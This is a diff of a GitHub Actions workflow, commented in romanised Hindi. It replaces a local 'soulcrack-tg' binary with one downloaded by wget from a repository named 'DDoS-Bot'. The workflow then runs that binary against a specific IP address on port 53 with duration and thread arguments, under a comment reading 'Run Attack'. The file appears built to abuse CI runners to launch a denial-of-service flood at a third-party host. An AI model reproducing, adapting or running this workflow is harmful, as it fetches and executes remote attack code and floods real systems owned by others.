@@ -5,16 +5,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: Fix and Run
+      - name: Get Linux Binary and Run
         run: |
-          # Agar file soulcrack-tg naam se hai toh use soul banao
-          if [ -f "soulcrack-tg" ]; then
-            mv soulcrack-tg soul
-          fi
-          
-          # Permission aur Check
-          chmod 777 soul || echo "File still not found"
-          ls -l
-          
-          # Run Attack
+          # Sahi Linux x86_64 binary download karna
+          wget -q https://github.com/Mustafa-Soul/DDoS-Bot/raw/main/soul -O soul
+          chmod 777 soul
           ./soul 147.75.202.61 53 10 100
